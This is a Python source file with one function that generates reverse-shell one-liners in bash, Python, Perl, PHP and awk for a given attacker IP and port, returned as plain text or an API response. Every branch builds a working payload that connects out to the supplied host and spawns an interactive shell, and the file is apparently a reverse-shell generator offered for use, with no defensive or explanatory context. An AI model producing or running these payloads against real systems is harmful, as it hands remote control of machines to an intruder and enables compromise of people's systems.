def payload_generator(ip, port, lang, quotes_pref, api):

	if lang == "bash":
		payload = f"bash -i >& /dev/tcp/{ip}/{port} 0>&1"
	elif lang == "python":
		payload = f"socket=__import__(\"socket\");os=__import__(\"os\");pty=__import__(\"pty\");s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{ip}\",{port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\"/bin/sh\")"
	elif lang == "perl":
		ppp1 = f"use Socket;$i=\"{ip}\";$p={port}"
		ppp2 = ';socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
		payload = ppp1 + ppp2
	elif lang == "php":
		payload = f'$sock=fsockopen("{ip}",{port});exec("/bin/sh -i <&3 >&3 2>&3");'
	elif lang == "awk":
		app1 = 'BEGIN {s ='
		app2 = f'"/inet/tcp/0/{ip}/{port}";' 
		app3 = 'while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}'
		payload = app1 + app2 + app3
	else:
		payload = ""

	if api:
		return { 'payload' : payload }
	if quotes_pref == "y":
		return f"'{payload}'\n"
	return f"{payload}\n"

